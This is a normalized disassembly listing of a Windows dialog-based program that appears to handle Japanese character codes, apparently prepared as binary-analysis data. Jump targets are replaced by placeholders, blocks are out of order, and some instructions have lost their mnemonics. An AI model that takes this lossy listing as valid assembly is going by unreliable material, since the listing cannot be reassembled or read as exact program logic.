xor eax eax
mov ax [ ecx ]
xor edx edx
test ax ax
je r-xdata
mov ecx [ rw-data ]
mov [ ecx + edx * 4 + 0x30 ] si
mov eax [ rw-data ]
inc [ eax + edx * 4 + 0x32 ]
pop esi
retn 0x4
lea esp [ esp ]
mov ax [ ecx + 0x4 ]
add ecx 0x4
inc edx
test ax ax
jne r-xdata
movzx eax ax
cmp eax esi
je r-xdata
sub_4163a0
push ebx
push ebp
mov ebp [ esp + 0xc ]
test ebp ebp
push esi
mov ebx eax
mov esi ecx
je r-xdata
pop esi
pop ebp
pop ebx
retn
push edi
push 0x2121
call sub_40b760
xor edi edi
test ebp ebp
jle r-xdata
pop edi
test edi edi
je r-xdata
push 0x1
push ebx
mov ebx [ esp + 0x20 ]
call sub_414bf0
add esp 0x8
inc edi
cmp edi ebp
mov ebx eax
jl r-xdata
mov eax [ esp + 0x18 ]
test eax eax
mov ecx esi
jne r-xdata
push 0x213f
call sub_40b760
push r--data
call sub_40b850
jmp r-xdata
sub_416420
push ebx
push ebp
push esi
mov ebp ecx
push edi
mov ebx ebp
mov edx [ rw-data ]
cmp [ edx ] 0x0
je r-xdata
nop
pop edi
pop esi
pop ebp
pop ebx
retn
mov ebx [ ebx ]
cmp ebx ebp
jne r-xdata
mov esi [ esi ]
test esi esi
jne r-xdata
lea esp [ esp ]
mov esi [ ebx + 0x4c ]
test esi esi
je r-xdata
mov eax [ esi + 0x18 ]
xor edi edi
test eax eax
jle r-xdata
mov eax [ esi + 0x10 ]
movzx ecx [ eax + edi * 2 ]
push ecx
mov ecx [ rw-data ]
call sub_416300
mov eax [ esi + 0x18 ]
inc edi
cmp edi eax
jl r-xdata
sub_4164c0
sub esp 0x26c
push esi
mov esi [ esp + 0x274 ]
test esi esi
push edi
je r-xdata
push 0x0
lea ecx [ esp + 0x10 ]
mov [ esp + 0x270 ] 0xffffffff
call sub_415ea0
test eax eax
jne r-xdata
mov edi [ RegisterClassA@IAT ]
push esi
mov [ esi ] 0x3
mov [ esi + 0x1c ] 0x10
mov [ esi + 0x4 ] sub_414d40
mov [ esi + 0x24 ] r--data
call edi
test ax ax
je r-xdata
pop edi
xor eax eax
pop esi
add esp 0x26c
retn
mov ecx [ esp + 0x26c ]
push eax
lea eax [ esp + 0xc ]
push eax
push 0x4
push rw-data
push ecx
call [ ReadFile@IAT ]
lea ecx [ esp + 0xc ]
call sub_415190
pop edi
mov eax 0x1
pop esi
add esp 0x26c
retn
push esi
mov [ esi ] 0xb
mov [ esi + 0x1c ] 0x6
mov [ esi + 0x4 ] sub_414e50
mov [ esi + 0x24 ] r--data
call edi
test ax ax
jne r-xdata
sub_416580
mov eax [ esp + 0x8 ]
cmp eax 0x110
push ebx
mov ebx ecx
ja r-xdata
cmp eax 0x111
je r-xdata
je r-xdata
movzx eax [ esp + 0x10 ]
cmp eax 0x5e6
jg r-xdata
cmp eax 0x214
jne r-xdata
push esi
push edi
mov edi [ esp + 0x10 ]
push 0x0
push 0x0
push 0x0
push rw-data
push 0x5e6
push edi
mov ecx rw-data
call sub_4206e0
push edi
mov ecx ebx
call sub_4158e0
xor esi esi
lea esp [ esp ]
cmp eax 0x5
je r-xdata
cmp eax 0x5e8
jne r-xdata
je r-xdata
xor eax eax
pop ebx
retn 0x10
mov eax [ esp + 0x14 ]
push eax
mov ecx rw-data
call sub_4209c0
xor eax eax
pop ebx
retn 0x10
movzx edx [ esi + rw-data ]
push edx
push esi
push edi
mov ecx ebx
call sub_4151e0
inc esi
cmp esi 0xd
jl r-xdata
pop edi
pop esi
xor eax eax
pop ebx
retn 0x10
mov ecx [ esp + 0x10 ]
push ecx
mov ecx rw-data
call sub_420810
cmp eax 0x53
jne r-xdata
mov edx [ esp + 0x8 ]
push 0x0
push 0x0
push 0x407
push 0x5e6
push edx
call [ SendDlgItemMessageA@IAT ]
mov eax 0x1
pop ebx
retn 0x10
test eax eax
jle r-xdata
mov eax [ esp + 0x8 ]
push 0x600
push eax
call sub_414bc0
add esp 0x8
mov eax 0x1
pop ebx
retn 0x10
cmp eax 0x2
jg r-xdata
mov ecx [ esp + 0x8 ]
push 0x0
push ecx
call [ EndDialog@IAT ]
mov eax 0x1
pop ebx
retn 0x10
sub_4166b0
sub esp 0x224
push ebx
push ebp
push esi
mov esi ecx
xor eax eax
mov ax [ esi + 0x25c ]
cmp ax 0xff
push edi
jbe r-xdata
mov edi [ esp + 0x238 ]
mov ebp [ SetDlgItemTextA@IAT ]
push r--data
push 0x903
push edi
call ebp
mov ebx [ SendDlgItemMessageA@IAT ]
push 0x0
push 0x0
push 0x40a
push 0x8fc
push edi
call ebx
movzx eax [ esi + 0x25c ]
push eax
push 0x0
push 0x401
push 0x8ff
push edi
call ebx
push 0x0
push 0x0
push 0x401
push 0x904
push edi
call ebx
push 0x0
push 0x0
push 0x401
push 0x905
push edi
call ebx
cmp [ esi + 0x25c ] 0x3000
sbb ecx ecx
inc ecx
push ecx
push 0x900
push edi
call [ GetDlgItem@IAT ]
push eax
call [ EnableWindow@IAT ]
xor edx edx
mov eax esi
mov [ eax ] edx
mov [ eax + 0x4 ] edx
mov [ eax + 0x8 ] edx
mov [ eax + 0xc ] edx
xor ecx ecx
mov cx [ esi + 0x25c ]
mov eax ecx
and eax 0x7f00
cmp ax 0x2400
je r-xdata
and eax 0x7f7f
mov [ esi + 0x25c ] ax
mov eax ecx
and eax 0xff
cmp ax 0x21
jb r-xdata
cmp ax 0x2500
jne r-xdata
cmp cx 0x3000
jb r-xdata
cmp ax 0x76
ja r-xdata
xor ebx ebx
and ecx 0xff
cmp cx 0x21
jb r-xdata
push 0x8fc
push edi
call [ GetDlgItem@IAT ]
push eax
lea ecx [ esp + 0x28 ]
call sub_40aa30
mov al [ rw-data ]
test al al
je r-xdata
movzx eax [ ebx + rw-data ]
push eax
push ebx
push edi
mov ecx esi
call sub_4151e0
inc ebx
cmp ebx 0x1b
jle r-xdata
pop edi
pop esi
pop ebp
pop ebx
add esp 0x224
retn 0x4
cmp cx 0x7e
ja r-xdata
xor eax eax
mov ax [ esi + 0x25c ]
xor edx edx
mov dl al
xor ecx ecx
push 0x1
push ecx
and eax 0xff
and edx 0xff
cmp edx 0x73
lea edx [ esp + 0x2c ]
ja r-xdata
mov ebp rw-data
mov ebx ebp
push edi
mov ecx esi
call sub_415ea0
test eax eax
jne r-xdata
lea eax [ eax * 4 + rw-data ]
call sub_414ca0
add esp 0x8
jmp r-xdata
lea eax [ eax * 4 + rw-data ]
call sub_414ca0
add esp 0x8
jmp r-xdata
mov al [ ebx + 0x8 ]
add ebx 0x8
test al al
mov ebp ebx
jne r-xdata
mov cl [ esi + 0x25c ]
cmp cl [ ebp ]
jne r-xdata
movzx eax [ esi + 0x25c ]
push 0x3
push eax
mov ecx esi
call sub_415a70
mov ecx esi
call sub_415190
xor ecx ecx
mov cl [ esi ]
and ecx 0xff
push ecx
push 0x0
push 0x401
push 0x904
push edi
call ebx
mov eax [ esi + 0xc ]
and eax 0xff
jne r-xdata
mov cl [ ebx + 0x1 ]
test cl cl
lea eax [ ebx - 0x6 ]
jne r-xdata
push 0x1
push 0x0
xor ecx ecx
lea edx [ esp + 0x2c ]
call sub_414ca0
add esp 0x8
push eax
xor eax eax
mov al [ esi ]
lea ecx [ esp + 0x14 ]
and eax 0xff
push eax
push r--data
push ecx
call [ wsprintfA@IAT ]
add esp 0x10
lea edx [ esp + 0x10 ]
push edx
push 0x903
push edi
call ebp
mov eax [ esi + 0xc ]
and eax 0xff
push eax
push 0x0
push 0x401
push 0x905
push edi
call ebx
xor edx edx
mov dl [ esi ]
push 0x1
and edx 0xff
push edx
push 0x903
push edi
call [ SetDlgItemInt@IAT ]
jmp r-xdata
mov eax [ esi + 0x22c ]
xor ecx ecx
mov cl [ esi + 0x2 ]
xor ebx ebx
and ecx 0xf0
test cx cx
jbe r-xdata
push 0xa8
lea ecx [ esp + 0x28 ]
call sub_40baf0
mov ebp [ GetDlgItem@IAT ]
push 0x8fc
push edi
call ebp
push eax
lea ecx [ esp + 0x28 ]
call sub_40aa30
mov al [ rw-data ]
test al al
je r-xdata
mov al [ rw-data ]
test al al
je r-xdata
xor edx edx
mov dl [ esi + 0x2 ]
xor ecx ecx
shr edx 0x4
and edx 0xf
push edx
push ebx
lea edx [ esp + 0x2c ]
call sub_414ca0
xor ecx ecx
mov cl [ esi + 0x2 ]
add esp 0x8
inc ebx
shr ecx 0x4
and ecx 0xf
cmp ebx ecx
jl r-xdata
mov eax [ esi + 0x224 ]
xor edx edx
mov dx [ esi ]
xor ebx ebx
and edx 0xe000
test dx dx
jbe r-xdata
test [ esi + 0x1 ] 0xe0
je r-xdata
mov al [ rw-data ]
test al al
je r-xdata
movzx ecx [ esi ]
shr ecx 0xd
push ecx
push ebx
mov ecx 0x2500
lea edx [ esp + 0x2c ]
call sub_414ca0
movzx edx [ esi ]
add esp 0x8
inc ebx
shr edx 0xd
cmp ebx edx
jl r-xdata
push 0xa9
lea ecx [ esp + 0x28 ]
call sub_40baf0
mov eax [ esi + 0x228 ]
xor ecx ecx
mov cx [ esi + 0x4 ]
xor ebx ebx
and ecx 0x7c0
test cx cx
jbe r-xdata
test [ esi + 0x4 ] 0x7c0
je r-xdata
mov al [ rw-data ]
test al al
je r-xdata
xor edx edx
mov dx [ esi + 0x4 ]
mov ecx 0x2400
shr edx 0x6
and edx 0x1f
push edx
push ebx
lea edx [ esp + 0x2c ]
call sub_414ca0
xor ecx ecx
mov cx [ esi + 0x4 ]
add esp 0x8
inc ebx
shr ecx 0x6
and ecx 0x1f
cmp ebx ecx
jl r-xdata
push 0xaa
lea ecx [ esp + 0x28 ]
call sub_40baf0
mov eax [ esi + 0x230 ]
xor edx edx
mov dx [ esi + 0x4 ]
xor ebx ebx
and edx 0xf800
test dx dx
jbe r-xdata
test [ esi + 0x5 ] 0xf8
je r-xdata
push 0x8fc
push edi
call ebp
push eax
call [ SetFocus@IAT ]
lea ebx [ ebx ]
push 0xab
lea ecx [ esp + 0x28 ]
call sub_40baf0
movzx ecx [ esi + 0x4 ]
shr ecx 0xb
push ecx
push ebx
mov ecx 0x2400
lea edx [ esp + 0x2c ]
call sub_414ca0
movzx edx [ esi + 0x4 ]
add esp 0x8
inc ebx
shr edx 0xb
cmp ebx edx
jl r-xdata
sub_416af0
push ebx
mov ebx [ esp + 0xc ]
cmp ebx 0x110
push esi
mov esi [ esp + 0xc ]
push edi
mov edi [ esp + 0x1c ]
jne r-xdata
push 0xffffffeb
push esi
call [ GetWindowLongA@IAT ]
mov ecx [ esp + 0x18 ]
push edi
push ecx
push ebx
push esi
mov ecx eax
call sub_416580
pop edi
pop esi
pop ebx
retn 0x10
push edi
push 0xffffffeb
push esi
call [ SetWindowLongA@IAT ]
sub_416b30
mov eax [ esp + 0x8 ]
cmp eax 0x110
push esi
push edi
mov esi ecx
ja r-xdata
cmp eax 0x111
je r-xdata
je r-xdata
movzx eax [ esp + 0x14 ]
cmp eax 0x8fe
jg r-xdata
cmp eax 0x214
je r-xdata
mov edi [ esp + 0xc ]
push 0x98b
push 0x97a
push 0x0
push rw-data
push 0x8fc
push edi
mov ecx rw-data
mov [ esi + 0x264 ] edi
call sub_4206e0
push 0x1
push edi
call sub_4258a0
add esp 0x8
push edi
mov ecx esi
call sub_4166b0
pop edi
xor eax eax
pop esi
retn 0x10
sub eax 0x2
je r-xdata
sub eax 0x8ff
je r-xdata
je r-xdata
mov ecx [ esp + 0x18 ]
push ecx
mov ecx rw-data
call sub_4209c0
pop edi
xor eax eax
pop esi
retn 0x10
cmp eax 0x413
jne r-xdata
cmp esi [ rw-data ]
jne r-xdata
sub eax 0x3
je r-xdata
push 0x0
mov ecx rw-data
call sub_40d9b0
push 0x1
add esi 0x25c
push esi
mov ecx eax
call sub_4107e0
dec eax
jne r-xdata
mov eax [ esp + 0xc ]
push 0x0
push 0x0
push 0x407
push 0x8fc
push eax
call [ SendDlgItemMessageA@IAT ]
pop edi
mov eax 0x1
pop esi
retn 0x10
cmp eax 0x8fc
jg r-xdata
pop edi
xor eax eax
pop esi
retn 0x10
mov ax [ esp + 0x18 ]
mov edi [ esp + 0xc ]
push 0x1
push 0x0
push edi
mov [ esi + 0x25c ] ax
call [ InvalidateRect@IAT ]
push edi
mov ecx esi
call sub_4166b0
pop edi
mov eax 0x1
pop esi
retn 0x10
mov edx [ esp + 0xc ]
push edx
call sub_4258e0
push esi
call j_sub_429931
add esp 0x8
pop edi
mov eax 0x1
pop esi
retn 0x10
mov [ rw-data ] 0x0
mov ecx [ esp + 0x14 ]
push ecx
mov ecx rw-data
call sub_420810
sub eax 0x4e
jne r-xdata
mov ecx [ esp + 0xc ]
push esi
push sub_416af0
push ecx
push 0x3a9
call sub_420d20
add esp 0x10
pop edi
mov eax 0x1
pop esi
retn 0x10
cmp eax 0x8fd
jne r-xdata
je r-xdata
mov eax [ esp + 0xc ]
push 0x600
push eax
call sub_414bc0
add esp 0x8
pop edi
mov eax 0x1
pop esi
retn 0x10
mov edi [ esp + 0xc ]
push edi
call sub_401da0
add esp 0x4
test eax eax
je r-xdata
test eax eax
jle r-xdata
pop edi
mov eax 0x1
pop esi
retn 0x10
mov eax [ eax + 0x4c ]
mov ecx [ eax + 0x10 ]
mov dx [ ecx ]
push 0x1
push 0x0
push edi
mov [ esi + 0x25c ] dx
call [ InvalidateRect@IAT ]
push edi
mov ecx esi
call sub_4166b0
pop edi
mov eax 0x1
pop esi
retn 0x10
cmp eax 0x2
jg r-xdata
mov edx [ esp + 0xc ]
push edx
call [ DestroyWindow@IAT ]
pop edi
mov eax 0x1
pop esi
retn 0x10
sub_416d60
push ebx
mov ebx [ esp + 0xc ]
cmp ebx 0x110
push esi
mov esi [ esp + 0xc ]
push edi
mov edi [ esp + 0x1c ]
jne r-xdata
push 0xffffffeb
push esi
call [ GetWindowLongA@IAT ]
mov ecx [ esp + 0x18 ]
push edi
push ecx
push ebx
push esi
mov ecx eax
call sub_416b30
pop edi
pop esi
pop ebx
retn 0x10
push edi
push 0xffffffeb
push esi
call [ SetWindowLongA@IAT ]
sub_416da0
mov al [ rw-data ]
test al al
je r-xdata
push esi
push 0x268
call sub_42991a
mov esi eax
add esp 0x4
test esi esi
je r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
mov eax [ esp + 0x8 ]
push eax
call sub_420ef0
add esp 0x4
pop esi
retn
mov edx [ esp + 0x8 ]
mov cx [ esp + 0xc ]
push esi
push sub_416d60
push edx
mov [ esi + 0x260 ] 0xffffffff
push 0x393
mov [ esi + 0x25c ] cx
call sub_420cd0
mov al [ rw-data ]
add esp 0x10
test al al
je r-xdata
mov ecx [ esp + 0x8 ]
mov edx [ eax + 0x264 ]
push ecx
push 0x0
push 0x413
push edx
call [ SendMessageA@IAT ]
retn
pop esi
retn
mov [ rw-data ] esi
sub_416e30
mov eax [ esp + 0x8 ]
sub esp 0x494
cmp eax 0x53
push ebx
push esi
push edi
ja r-xdata
sub eax 0x110
je r-xdata
je r-xdata
mov edi [ esp + 0x4a4 ]
push 0x0
push 0x0
push 0x0
push rw-data
push 0x3f2
push edi
mov ecx rw-data
call sub_4206e0
mov ecx [ rw-data ]
push 0x1
push edi
mov [ ecx + 0x2c ] edi
call sub_4258a0
add esp 0x8
push r--data
push 0x3ef
push edi
call [ SetDlgItemTextA@IAT ]
mov ebx [ CheckDlgButton@IAT ]
mov esi 0x3eb
lea esp [ esp ]
dec eax
je r-xdata
mov eax [ esp + 0x4a4 ]
push 0x60c
push eax
call sub_414bc0
add esp 0x8
pop edi
pop esi
mov eax 0x1
pop ebx
add esp 0x494
retn 0x10
sub eax 0x2
je r-xdata
push 0x1
push esi
push edi
call ebx
inc esi
cmp esi 0x3ee
jle r-xdata
pop edi
pop esi
mov eax 0x1
pop ebx
add esp 0x494
retn 0x10
movzx eax [ esp + 0x4ac ]
cmp eax 0x3e9
jg r-xdata
sub eax 0x103
jne r-xdata
mov ecx [ esp + 0x4a4 ]
push ecx
call sub_4258e0
mov edx [ rw-data ]
push edx
call j_sub_429931
add esp 0x8
pop edi
pop esi
mov [ rw-data ] 0x0
mov eax 0x1
pop ebx
add esp 0x494
retn 0x10
dec eax
je r-xdata
sub eax 0x3ea
cmp eax 0x8
ja r-xdata
je r-xdata
pop edi
pop esi
xor eax eax
pop ebx
add esp 0x494
retn 0x10
mov ecx [ esp + 0x4b0 ]
push ecx
mov ecx rw-data
call sub_4209c0
pop edi
pop esi
xor eax eax
pop ebx
add esp 0x494
retn 0x10
mov ecx rw-data
call sub_4207d0
sub eax 0x2
jne r-xdata
movzx ecx [ eax + lookup_table_4174b0 ]
jmp [ ecx * 4 + jump_table_4174a0 ]
mov esi [ esp + 0x4a4 ]
push 0x3e9
push esi
call [ IsDlgButtonChecked@IAT ]
test eax eax
je r-xdata
dec eax
je r-xdata
mov eax [ esp + 0x4ac ]
push eax
mov ecx rw-data
call sub_420810
pop edi
pop esi
xor eax eax
pop ebx
add esp 0x494
retn 0x10
mov esi [ esp + 0x4a4 ]
push 0x3ea
push esi
call [ IsDlgButtonChecked@IAT ]
test eax eax
je r-xdata
mov edx [ rw-data ]
mov eax [ esp + 0x4a4 ]
push edx
push 0x0
push 0x407
push 0x3f2
push eax
call [ SendDlgItemMessageA@IAT ]
pop edi
pop esi
mov eax 0x1
pop ebx
add esp 0x494
retn 0x10
mov esi [ esp + 0x4a4 ]
lea ecx [ esp + 0xc ]
push ecx
push 0x3f2
push esi
call sub_4151c0
add esp 0xc
test eax eax
jne r-xdata
push 0x0
push 0x3ea
push esi
call [ CheckDlgButton@IAT ]
pop edi
pop esi
mov eax 0x1
pop ebx
add esp 0x494
retn 0x10
mov ebx [ esp + 0x4a4 ]
push ebp
push 0x0
push 0x0
push 0x40a
push 0x3f2
push ebx
mov [ esp + 0x4b0 ] 0xffffffff
call [ SendDlgItemMessageA@IAT ]
mov edi [ rw-data ]
xor eax eax
mov ecx 0x18e9
[ edi ]
mov ecx [ rw-data ]
call sub_4162d0
mov ebp [ IsDlgButtonChecked@IAT ]
push 0x3e8
push ebx
call ebp
mov ecx [ rw-data ]
mov [ ecx ] eax
mov ecx [ rw-data ]
call sub_416420
xor esi esi
dec eax
je r-xdata
push 0x0
push 0x3e9
push esi
call [ CheckDlgButton@IAT ]
pop edi
pop esi
mov eax 0x1
pop ebx
add esp 0x494
retn 0x10
mov edx [ esp + 0xc ]
movzx eax [ edx ]
push eax
push esi
call sub_416da0
add esp 0x8
pop edi
pop esi
mov eax 0x1
pop ebx
add esp 0x494
retn 0x10
push 0x40
call [ MessageBeep@IAT ]
pop edi
pop esi
mov eax 0x1
pop ebx
add esp 0x494
retn 0x10
add esi 0x4
cmp esi 0x6374
jl r-xdata
movzx edx [ esi + eax + 0x30 ]
push edx
mov ecx rw-data
call sub_4139e0
test eax eax
mov eax [ rw-data ]
je r-xdata
mov edx [ esp + 0x4a4 ]
push edx
call [ DestroyWindow@IAT ]
pop edi
pop esi
mov eax 0x1
pop ebx
add esp 0x494
retn 0x10
sub eax 0x3e5
jne r-xdata
mov eax [ rw-data ]
xor edi edi
cmp [ esi + eax + 0x32 ] di
je r-xdata
push 0x3e9
push ebx
call ebp
test eax eax
je r-xdata
movsx edx [ esi + eax + 0x32 ]
add [ eax + 0x18 ] edx
mov eax [ rw-data ]
inc [ eax + 0x20 ]
movsx ecx [ esi + eax + 0x32 ]
add [ eax + 0x14 ] ecx
mov eax [ rw-data ]
inc [ eax + 0x1c ]
jmp r-xdata
push 0x3ea
push ebx
call ebp
test eax eax
je r-xdata
xor esi esi
mov eax [ rw-data ]
push sub_416400
push 0x4
add eax 0x30
push 0x18dd
push eax
call sub_429dd0
mov eax [ rw-data ]
add esp 0x10
xor esi esi
add eax 0x36
xor esi esi
add esi 0x4
cmp esi 0x6374
jl r-xdata
mov edx [ rw-data ]
mov [ esi + edx + 0x32 ] di
push edi
push esi
push 0x3ef
push ebx
call [ SetDlgItemInt@IAT ]
cmp esi edi
mov esi [ GetDlgItem@IAT ]
je r-xdata
cmp [ eax ] di
je r-xdata
add esi 0x4
cmp esi 0x6374
jl r-xdata
mov edx [ rw-data ]
mov [ esi + edx + 0x32 ] di
mov eax [ rw-data ]
movzx ecx [ esi + eax + 0x30 ]
push ecx
mov ecx rw-data
call sub_4139e0
test eax eax
je r-xdata
push 0x3eb
push ebx
call ebp
push 0x3ec
push ebx
mov edi eax
call ebp
push 0x3ed
push ebx
mov [ esp + 0x1c ] eax
call ebp
push 0x3ee
push ebx
mov [ esp + 0x18 ] eax
call ebp
push 0x3f2
push ebx
mov ebp eax
call esi
push eax
lea ecx [ esp + 0x30 ]
call sub_40aa30
push ebx
lea ecx [ esp + 0x240 ]
call sub_415ea0
mov ebx [ wsprintfA@IAT ]
xor esi esi
lea ecx [ ecx ]
push 0x3f2
push ebx
call esi
push eax
call [ SetFocus@IAT ]
inc esi
jmp r-xdata
cmp [ eax + 0x4 ] di
je r-xdata
mov eax [ rw-data ]
movzx ecx [ esi + eax + 0x30 ]
push ecx
mov ecx rw-data
call sub_4139e0
test eax eax
jne r-xdata
lea ecx [ esp + 0x23c ]
call sub_415190
mov eax [ rw-data ]
mov ecx [ eax + 0x10 ]
mov ebp [ eax + 0x24 ]
mov edx [ eax + 0xc ]
mov esi [ eax + 0x8 ]
mov edi [ eax + 0x4 ]
mov ebx [ eax + 0x20 ]
push ebp
push ecx
push edx
add edx ecx
mov ecx [ eax + 0x1c ]
push edx
mov edx [ eax + 0x14 ]
push esi
push edi
add edi esi
push edi
push ebx
push ecx
add ecx ebx
push ecx
mov ecx [ eax + 0x18 ]
push ecx
push edx
add edx ecx
push edx
mov edx [ eax + 0x28 ]
mov eax [ esp + 0x4dc ]
push edx
push 0x0
push 0x81
push 0x82
push eax
call sub_420e20
add esp 0x48
pop ebp
pop edi
pop esi
mov eax 0x1
pop ebx
add esp 0x494
retn 0x10
movzx ecx [ esi + eax + 0x30 ]
push 0x1
push ecx
lea ecx [ esp + 0x244 ]
call sub_415a70
lea ecx [ esp + 0x2c ]
call sub_40bad0
mov edx [ rw-data ]
movzx eax [ esi + edx + 0x30 ]
push eax
lea ecx [ esp + 0x30 ]
call sub_40b760
test edi edi
je r-xdata
add esi 0x2
jmp r-xdata
cmp [ eax + 0x8 ] di
je r-xdata
mov eax [ esp + 0x14 ]
test eax eax
je r-xdata
push 0x2121
lea ecx [ esp + 0x30 ]
call sub_40b760
mov ecx [ rw-data ]
movsx edx [ ecx + esi + 0x32 ]
push edx
lea eax [ esp + 0x1c ]
push r--data
push eax
call ebx
add esp 0xc
lea ecx [ esp + 0x18 ]
push ecx
lea ecx [ esp + 0x30 ]
call sub_40b850
add esi 0x3
jmp r-xdata
cmp [ eax + 0xc ] di
je r-xdata
mov eax [ esp + 0x10 ]
test eax eax
je r-xdata
movzx edx [ esp + 0x23c ]
mov eax [ esp + 0x460 ]
shr edx 0xd
push 0x2500
push edx
lea ecx [ esp + 0x34 ]
call sub_4163a0
add esp 0x8
add esi 0x4
add esi 0x5
add eax 0x14
cmp esi 0x18dd
jl r-xdata
test ebp ebp
je r-xdata
mov eax [ esp + 0x240 ]
shr eax 0x6
and eax 0x1f
push 0x2400
push eax
mov eax [ esp + 0x46c ]
lea ecx [ esp + 0x34 ]
call sub_4163a0
add esp 0x8
cmp [ eax - 0x4 ] di
je r-xdata
jmp r-xdata
push 0xffffffff
lea ecx [ esp + 0x30 ]
call sub_40b700
add esi 0x4
cmp esi 0x6374
jl r-xdata
mov ecx [ esp + 0x23e ]
mov eax [ esp + 0x468 ]
shr ecx 0x4
and ecx 0xf
push 0x0
push ecx
lea ecx [ esp + 0x34 ]
call sub_4163a0
add esp 0x8
mov eax [ rw-data ]
cmp [ eax + esi + 0x32 ] 0x0
je r-xdata
sub_4174c0
mov eax [ rw-data ]
test eax eax
je r-xdata
push 0x63a4
call sub_42991a
add esp 0x4
test eax eax
mov [ rw-data ] eax
jne r-xdata
mov eax [ eax + 0x2c ]
push eax
call [ SetForegroundWindow@IAT ]
retn
mov edx [ rw-data ]
push 0x0
push sub_416e30
push edx
push 0x392
call sub_420cd0
add esp 0x10
retn
mov ecx [ rw-data ]
push ecx
call sub_420ef0
add esp 0x4
retn
sub_417520
cmp ecx 0x41
jl r-xdata
cmp ecx 0x61
jl r-xdata
cmp ecx 0x5a
jle r-xdata
xor eax eax
lea ecx [ ecx ]
cmp ecx 0x7a
jg r-xdata
lea eax [ ecx + 0x2300 ]
retn
movzx eax [ eax * 4 + rw-data ]
retn
inc eax
cmp eax 0x39
jl r-xdata
movsx edx [ eax * 4 + rw-data ]
cmp edx ecx
je r-xdata
xor eax eax
retn
sub_417560
push ebx
push ebp
push esi
push edi
xor ebp ebp
mov edi rw-data
jmp r-xdata
mov esi edi
mov eax edx
sbb eax eax
sbb eax 0xffffffff
test cl cl
je r-xdata
pop edi
pop esi
lea eax [ ebp + 0x21 ]
pop ebp
pop ebx
retn
add edi 0x4
inc ebp
cmp edi rw-data
jl r-xdata
xor eax eax
jmp r-xdata
mov bl [ eax + 0x1 ]
mov cl bl
cmp bl [ esi + 0x1 ]
jne r-xdata
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
retn
test eax eax
je r-xdata
add eax 0x2
add esi 0x2
test cl cl
jne r-xdata
mov bl [ eax ]
mov cl bl
cmp bl [ esi ]
jne r-xdata
sub_4175c0
mov eax [ esp + 0x4 ]
test eax eax
push esi
jne r-xdata
cmp eax 0x3000
jl r-xdata
mov eax 0xa
pop esi
retn
cmp eax 0x20
je r-xdata
xor eax eax
pop esi
retn
mov eax 0x5
pop esi
retn
cmp eax 0x9
je r-xdata
cmp eax 0x2121
je r-xdata
mov esi eax
and esi 0x7f00
cmp esi 0x2500
jne r-xdata
cmp esi 0x2400
jne r-xdata
mov eax 0x2
pop esi
retn
cmp esi 0x2300
jne r-xdata
mov eax 0x3
pop esi
retn
push eax
call sub_429ce2
add esp 0x4
test eax eax
je r-xdata
mov eax 0x4
pop esi
retn
xor eax eax
test esi esi
setne al
pop esi
add eax 0x6
retn
mov eax 0x1
pop esi
retn
sub_417650
mov ecx [ esp + 0x4 ]
xor eax eax
jmp r-xdata
movzx edx [ eax * 4 + rw-data ]
cmp edx ecx
je r-xdata
movsx eax [ eax * 4 + rw-data ]
retn
inc eax
cmp eax 0x39
jl r-xdata
cmp ecx 0x2341
jl r-xdata
cmp ecx 0x2361
jl r-xdata
cmp ecx 0x235b
jl r-xdata
xor eax eax
retn
cmp ecx 0x237b
jge r-xdata
lea eax [ ecx - 0x2300 ]
retn
sub_4176b0
mov ecx [ esp + 0x4 ]
mov eax ecx
and eax 0x7f00
cmp eax 0x2400
je r-xdata
and ecx 0x7f
cmp ecx 0x21
jl r-xdata
cmp eax 0x2500
jne r-xdata
xor eax eax
retn
cmp ecx 0x73
jg r-xdata
lea eax [ ecx * 4 + rw-data ]
retn
sub_4176f0
push ecx
push ebp
mov ebp ecx
cmp [ ebp + 0x44 ] 0x1
push esi
push edi
mov [ ebp + 0x7c ] 0x0
jne r-xdata
cmp [ ebp + 0x44 ] 0x2
mov esi [ esp + 0x18 ]
jne r-xdata
call sub_424d30
mov ecx ebp
call sub_40f040
cmp esi 0x1
jne r-xdata
test esi esi
je r-xdata
push 0x0
push 0x2
mov ecx ebp
call sub_424dd0
mov eax [ ebp + 0x58 ]
movsx edi [ ebp + 0x5c ]
mov ecx [ eax ]
mov al [ rw-data ]
lea esi [ ebp + 0x54 ]
add edi ecx
test al al
jne r-xdata
mov eax [ ebp + 0x58 ]
movsx ecx [ ebp + 0x5c ]
mov edx [ eax + 0x4 ]
cmp ecx edx
jle r-xdata
push 0x0
mov ecx ebp
call sub_403e90
movsx edx [ ebp + 0x5c ]
mov eax [ esp + 0x14 ]
push 0x1
lea ecx [ esp + 0x10 ]
push ecx
mov ecx [ esi ]
mov [ esp + 0x14 ] eax
mov eax [ ebp + 0x58 ]
push edx
push eax
push ebp
call sub_421d20
mov ecx [ esi + 0x4 ]
movsx edx [ esi + 0x8 ]
cmp edx [ ecx + 0x4 ]
jge r-xdata
push 0x0
lea esi [ ebp + 0x54 ]
push esi
mov ecx ebp
call sub_40e010
lea edi [ ebp + 0x1c ]
mov ecx 0x5
[ edi ] [ esi ]
mov [ ebp + 0x44 ] 0x2
mov [ ebp + 0x5c ] dx
mov ecx ebp
call sub_424ac0
mov ecx ebp
call sub_40e6d0
pop edi
pop esi
pop ebp
pop ecx
retn 0x8
push 0x0
push esi
mov ecx ebp
call sub_40e010
lea edi [ ebp + 0x30 ]
mov ecx 0x5
[ edi ] [ esi ]
push 0x2
mov ecx ebp
call sub_403e90
mov ecx ebp
call sub_4015b0
movsx ecx [ ebp + 0x5c ]
mov eax [ esp + 0x14 ]
mov edx [ ebp + 0x58 ]
push eax
push ecx
mov ecx [ esi ]
push edx
push ebp
call sub_421df0
jmp r-xdata
mov ecx [ esi ]
mov [ ebp + 0x5c ] di
mov edx [ ecx + 0x8 ]
push 0x1
mov ecx esi
mov [ ebp + 0x58 ] edx
call sub_40e930
cmp [ ebp + 0x44 ] 0x2
jne r-xdata
sub_417820
push esi
mov esi ecx
mov dl [ esi + 0xb ]
mov ecx [ esp + 0x8 ]
xor eax eax
test dl dl
setne al
push eax
push ecx
mov ecx [ esi + 0xc ]
call sub_4176f0
mov [ esi + 0xb ] 0x0
pop esi
retn 0x4
sub_417850
push ecx
push ebx
push ebp
push esi
push edi
mov edi ecx
movsx eax [ edi ]
push eax
mov [ esp + 0x14 ] 0x2500
call sub_429c67
mov ebx eax
mov al [ edi ]
add esp 0x4
test al al
mov esi edi
mov ebp 0x2400
je r-xdata
test ebx ebx
je r-xdata
lea ebx [ ebx ]
mov edx edi
call sub_417560
